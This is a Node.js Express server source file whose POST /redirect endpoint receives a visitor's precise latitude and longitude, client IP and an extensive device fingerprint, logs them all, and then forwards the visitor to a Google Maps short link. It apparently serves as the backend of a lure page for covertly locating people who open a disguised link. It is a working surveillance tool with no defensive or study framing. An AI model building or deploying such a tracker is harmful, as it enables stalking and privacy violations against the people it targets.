const express = require('express');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Receive location and respond with redirect URL
app.post('/redirect', (req, res) => {
  const { latitude, longitude, deviceInfo } = req.body;

  if (!latitude || !longitude) {
    return res.status(400).json({
      success: false,
      message: 'Location data missing'
    });
  }

  // Get client IP address
  const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                   req.headers['x-real-ip'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   'Unknown';

  console.log('='.repeat(50));
  console.log('User Location Allowed');
  console.log(`Timestamp: ${new Date().toISOString()}`);
  console.log('-'.repeat(50));
  console.log('LOCATION:');
  console.log(`  Latitude: ${latitude}`);
  console.log(`  Longitude: ${longitude}`);
  console.log(`  IP Address: ${clientIP}`);
  console.log('-'.repeat(50));
  
  if (deviceInfo) {
    console.log('DEVICE INFORMATION:');
    if (deviceInfo.operatingSystem) {
      console.log(`  Operating System: ${deviceInfo.operatingSystem}`);
    }
    if (deviceInfo.browser) {
      console.log(`  Browser: ${deviceInfo.browser}`);
    }
    if (deviceInfo.screenSize) {
      console.log(`  Screen Size: ${deviceInfo.screenSize}`);
    }
    if (deviceInfo.cpuCores) {
      console.log(`  CPU Cores: ${deviceInfo.cpuCores}`);
    }
    if (deviceInfo.cpuInfo) {
      console.log(`  CPU Info: ${deviceInfo.cpuInfo}`);
    }
    if (deviceInfo.gpu) {
      console.log(`  GPU: ${deviceInfo.gpu}`);
    }
    if (deviceInfo.deviceMemory) {
      console.log(`  Device Memory: ${deviceInfo.deviceMemory} GB`);
    }
    if (deviceInfo.language) {
      console.log(`  Language: ${deviceInfo.language}`);
    }
    if (deviceInfo.timezone) {
      console.log(`  Timezone: ${deviceInfo.timezone}`);
    }
    if (deviceInfo.userAgent) {
      console.log(`  User Agent: ${deviceInfo.userAgent}`);
    }
    if (deviceInfo.isp) {
      console.log(`  ISP: ${deviceInfo.isp}`);
    }
    if (deviceInfo.city) {
      console.log(`  City: ${deviceInfo.city}`);
    }
    if (deviceInfo.country) {
      console.log(`  Country: ${deviceInfo.country}`);
    }
  }
  console.log('='.repeat(50));
  console.log('');

  res.json({
    success: true,
    redirectUrl: 'https://maps.app.goo.gl/Gp7AjiVwo3vu6UZb9'
  });
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
